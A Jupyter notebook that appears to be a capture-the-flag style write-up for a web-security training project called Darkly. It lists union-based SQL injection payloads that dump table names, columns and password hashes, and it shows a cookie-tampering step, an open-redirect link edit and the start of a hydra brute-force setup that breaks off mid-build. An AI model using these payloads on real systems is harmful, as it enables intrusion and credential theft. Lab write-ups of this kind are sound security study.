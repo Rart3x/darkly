{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ccea90a7-8592-456f-8cf5-0b233f7f1ad3",
   "metadata": {},
   "source": [
    "# <center>Darkly</center>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b0a106b0-de48-4470-a783-39db2022e7a5",
   "metadata": {},
   "source": [
    "***\n",
    "## <center>1 - SQL Injection in search member page</center>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4741dd6f-c529-4b8c-8adb-da561bfc1615",
   "metadata": {},
   "source": [
    "| ID | Query                                                                                                                      |\n",
    "|----|----------------------------------------------------------------------------------------------------------------------------|\n",
    "| 1  | ```1 union all select 1, 2```                                                                                              |\n",
    "| 2  | ```1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database()```           |\n",
    "| 3  | ```1 union all select 1,group_concat(column_name) from Information_schema.columns where table_schema=database()```         |\n",
    "| 4  | ```1 union all select 1,group_concat(Commentaire) from users```                                                            |\n",
    "| 5  | ```1 union all select 1,group_concat(countersign) from users```                                                     |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "20e0b52f-25ab-4922-9efd-d73063bde5ca",
   "metadata": {},
   "source": [
    "5ff9d0165b4f92b14994e5c685cdce28 -> FortyTwo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "b1637691-818d-47d2-8397-d61b9b5bae41",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[92mFlag 1 : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 \u001b[0m\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "\n",
    "print(\"\\033[92mFlag 1 :\", hashlib.sha256(b\"fortytwo\").hexdigest(),\"\\033[0m\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "08193f3b-a732-44ef-b363-75056c3cc03e",
   "metadata": {},
   "source": [
    "***\n",
    "## <center>2 - SQL Injection in search image page</center>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "45cb81bc-cfa1-4beb-9f78-e003d85b1826",
   "metadata": {},
   "source": [
    "| ID | Query                                                                                                                      |\n",
    "|----|----------------------------------------------------------------------------------------------------------------------------|\n",
    "| 1  | ```1 union all select 1, database()```                                                                                     |\n",
    "| 2  | ```1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database()```          |\n",
    "| 3  | ```1 union all select 1,group_concat(column_name) from Information_schema.columns where table_schema=database()```      |\n",
    "| 4  | ```1 union all select 1,group_concat(comment) from list_images```                                                           |\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4868e2cf-bdba-4195-a07b-77a9ede50342",
   "metadata": {},
   "source": [
    "1928e8083cf461a51303633093573c46 -> albatroz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "82d04fd7-f88e-47d3-8c3b-ddc655ae994e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[92mFlag 2 : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 \u001b[0m\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "\n",
    "print(\"\\033[92mFlag 2 :\", hashlib.sha256(b\"albatroz\").hexdigest(),\"\\033[0m\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1c3038ea-b072-4458-9533-10d2082d6ad1",
   "metadata": {},
   "source": [
    "***\n",
    "## <center>3 - Cookie</center>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d4cf7257-63a7-4a32-a977-42ae20f95713",
   "metadata": {},
   "outputs": [],
   "source": [
    "68934a3e9455fa72420237eb05902327 -> false | true -> b326b5062b2f0e69046810717534cb09"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c62d077a-3723-4070-bf26-953af9b2be2b",
   "metadata": {},
   "source": [
    "<img src=\"assets/cookie.png\" alt=\"Description de l'image\" style=\"display: block; margin-left: auto; margin-right: auto;\">"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a7d56411-10b7-4ea6-8b26-1c0d67d6e19d",
   "metadata": {},
   "source": [
    "***\n",
    "## <center>4 - Redirections</center>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c70d2faa-f1c2-436a-9629-8b18ede8136f",
   "metadata": {},
   "source": [
    "From : ```<a href=\"index.php?page=redirect&amp;site=twitter\" class=\"icon fa-twitter\"></a>```<br>\n",
    "To   : ```<a href=\"index.php?page=redirect&amp;site=www.google.com\" class=\"icon fa-twitter\"></a>```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e48222ad-e80e-4755-9fe9-f2e24c948dac",
   "metadata": {},
   "source": [
    "<img src=\"assets/redirection.png\" alt=\"Description de l'image\" style=\"display: block; margin-left: auto; margin-right: auto;\">"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e4790150-47bf-4887-8f93-67cc51421054",
   "metadata": {},
   "source": [
    "***\n",
    "## <center>5 - Password bruteforcing</center>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "747d58af-10e6-4f8e-996f-f6ecc82aece6",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Cloning into 'thc-hydra'...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Starting hydra auto configuration ...\n",
      "Detected 64 Bit Linux OS\n",
      "\n",
      "Checking for zlib (libz/zlib.h) ...\n",
      "                                ... found\n",
      "Checking for openssl (libssl/libcrypto/ssl.h/sha.h) ...\n",
      "                                                    ... found\n",
      "Checking for gcrypt (libgcrypt/gpg-error.h) ...\n",
      "                                            ... gcrypt not found, radmin2 module disabled\n",
      "Checking for idn (libidn) ...\n",
      "                          ... NOT found, unicode logins and passwords will not be supported\n",
      "Checking for curses (libcurses/term.h) ...\n",
      "                                       ... found, color output enabled\n",
      "Checking for pcre2 (libpcre/pcre.h) ...\n",
      "                                    ... found\n",
      "Checking for Postgres (libpq/libpq-fe.h) ...\n",
      "                                         ... NOT found, module postgres disabled\n",
      "Checking for SVN (libsvn_client-1/libapr-1/libaprutil-1) ...\n",
      "                                                         ... NOT found, module svn disabled\n",
      "Checking for firebird (libfbclient) ...\n",
      "                                    ... NOT found, module firebird disabled\n",
      "Checking for MYSQL client (libmysqlclient/math.h) ...\n",
      "                                                  ... NOT found, module Mysql will not support version > 4.x\n",
      "Checking for AFP (libafpclient) ...\n",
      "                                ... NOT found, module Apple Filing Protocol disabled - Apple sucks anyway\n",
      "Checking for NCP (libncp/nwcalls.h) ...\n",
      "                                    ... NOT found, module NCP disabled\n",
      "Checking for SAP/R3 (librfc/saprfc.h) ...\n",
      "                                      ... NOT found, module sapr3 disabled\n",
      "Get it from http://www.sap.com/solutions/netweaver/linux/eval/index.asp\n",
      "Checking for libssh (libssh/libssh.h) ...\n",
      "                                      ... NOT found, module ssh disabled\n",
      "Get it from http://www.libssh.org\n",
      "Checking for Oracle (libocci/libclntsh/oci.h/libaio/liboci) ...\n",
      "                                                            ... NOT found, module Oracle disabled\n",
      "Get basic and sdk package from https://www.oracle.com/database/technologies/instant-client/downloads.html\n",
      "Checking for Memcached (libmemcached/memcached.h) ...\n",
      "                                                  ... NOT found, module memcached disabled\n",
      "Checking for Freerdp3 (libfreerdp3/freerdp.h/libwinpr3/winpr.h) ...\n",
      "                                                                ... NOT found, checking for freerdp2 module next...\n",
      "Checking for Freerdp2 (libfreerdp2/freerdp.h/libwinpr2/winpr.h) ...\n",
      "                                                                ... NOT found, module rdp disabled\n",
      "Checking for Mongodb (libmongoc-1.0/mongoc.h/libbson-1.0/bson.h) ...\n",
      "                                                                 ... NOT found, module mongodb disabled\n",
      "Checking for smbclient (libsmbclient/libsmbclient.h) ...\n",
      "                                                     ... NOT found, module smb2 disabled\n",
      "Checking for GUI req's (pkg-config/gtk+-2.0) ...\n",
      "                                             ... NOT found, optional anyway\n",
      "Checking for Android specialities ...\n",
      "                                  ... strrchr() found\n",
      "                                  ... RSA_generate_key() found\n",
      "Checking for secure compile option support in gcc ...\n",
      "                                                  Compiling... yes\n",
      "                                                  Linking... yes\n",
      "Checking for --allow-multiple-definition linker option ... yes\n",
      "\n",
      "Hydra will be installed into .../bin of: /usr/local\n",
      "  (change this by running ./configure --prefix=path)\n",
      "\n",
      "Writing Makefile.in ...\n",
      "now type \"make\"\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE  -o pw-inspector  pw-inspector.c\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-vnc.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-pcnfs.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pw-inspector.c:131:20: warning: passing 'unsigned char [257]' to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "    if (buf[strlen(buf) - 1] == '\\n')\n",
      "                   ^~~\n",
      "/usr/include/string.h:407:35: note: passing argument to parameter '__s' here\n",
      "extern size_t strlen (const char *__s)\n",
      "                                  ^\n",
      "pw-inspector.c:132:18: warning: passing 'unsigned char [257]' to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      buf[strlen(buf) - 1] = 0;\n",
      "                 ^~~\n",
      "/usr/include/string.h:407:35: note: passing argument to parameter '__s' here\n",
      "extern size_t strlen (const char *__s)\n",
      "                                  ^\n",
      "pw-inspector.c:133:20: warning: passing 'unsigned char [257]' to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "    if (buf[strlen(buf) - 1] == '\\r')\n",
      "                   ^~~\n",
      "/usr/include/string.h:407:35: note: passing argument to parameter '__s' here\n",
      "extern size_t strlen (const char *__s)\n",
      "                                  ^\n",
      "pw-inspector.c:134:18: warning: passing 'unsigned char [257]' to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      buf[strlen(buf) - 1] = 0;\n",
      "                 ^~~\n",
      "/usr/include/string.h:407:35: note: passing argument to parameter '__s' here\n",
      "extern size_t strlen (const char *__s)\n",
      "                                  ^\n",
      "pw-inspector.c:135:16: warning: passing 'unsigned char [257]' to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "    if (strlen(buf) >= minlen && strlen(buf) <= maxlen) {\n",
      "               ^~~\n",
      "/usr/include/string.h:407:35: note: passing argument to parameter '__s' here\n",
      "extern size_t strlen (const char *__s)\n",
      "                                  ^\n",
      "pw-inspector.c:135:41: warning: passing 'unsigned char [257]' to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "    if (strlen(buf) >= minlen && strlen(buf) <= maxlen) {\n",
      "                                        ^~~\n",
      "/usr/include/string.h:407:35: note: passing argument to parameter '__s' here\n",
      "extern size_t strlen (const char *__s)\n",
      "                                  ^\n",
      "pw-inspector.c:138:30: warning: passing 'unsigned char [257]' to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      for (i = 0; i < strlen(buf) && j; i++) {\n",
      "                             ^~~\n",
      "/usr/include/string.h:407:35: note: passing argument to parameter '__s' here\n",
      "extern size_t strlen (const char *__s)\n",
      "                                  ^\n",
      "7 warnings generated.\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-rexec.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-nntp.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-socks5.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-telnet.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-cisco.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-http.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-ftp.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-imap.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-pop3.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-smb.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "hydra-smb.c:576:25: warning: shifting a negative signed value is undefined [-Wshift-negative-value]\n",
      "  else if (ts.tv_sec == TIME_T_MAX)\n",
      "                        ^~~~~~~~~~\n",
      "hydra-smb.c:91:34: note: expanded from macro 'TIME_T_MAX'\n",
      "#define TIME_T_MAX (~(time_t)0 - TIME_T_MIN)\n",
      "                                 ^~~~~~~~~~\n",
      "hydra-smb.c:88:69: note: expanded from macro 'TIME_T_MIN'\n",
      "#define TIME_T_MIN ((time_t)0 < (time_t)-1 ? (time_t)0 : ~(time_t)0 << (sizeof(time_t) * CHAR_BIT - 1))\n",
      "                                                         ~~~~~~~~~~ ^\n",
      "hydra-smb.c:1210:55: warning: equality comparison with extraneous parentheses [-Wparentheses-equality]\n",
      "  if (/*(bufReceive == NULL) ||*/ (nReceiveBufferSize == 0))\n",
      "                                   ~~~~~~~~~~~~~~~~~~~^~~~\n",
      "hydra-smb.c:1210:55: note: remove extraneous parentheses around the comparison to silence this warning\n",
      "  if (/*(bufReceive == NULL) ||*/ (nReceiveBufferSize == 0))\n",
      "                                  ~                   ^   ~\n",
      "hydra-smb.c:1210:55: note: use '=' to turn this equality comparison into an assignment\n",
      "  if (/*(bufReceive == NULL) ||*/ (nReceiveBufferSize == 0))\n",
      "                                                      ^~\n",
      "                                                      =\n",
      "2 warnings generated.\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-icq.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-cisco-enable.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-ldap.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-memcached.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-mongodb.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-mysql.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-mssql.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-cobaltstrike.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-xmpp.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
